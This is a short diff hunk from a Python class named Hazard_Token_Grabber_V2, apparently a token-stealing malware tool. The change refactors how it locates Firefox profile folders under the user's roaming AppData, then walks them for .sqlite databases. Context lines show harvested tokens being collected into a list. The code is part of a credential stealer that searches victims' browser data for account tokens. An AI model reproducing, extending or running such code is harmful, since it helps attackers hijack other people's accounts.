@@ -323,8 +323,8 @@ class Hazard_Token_Grabber_V2:
                                         continue
                                     self.tokens.append(token)
 
-        if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
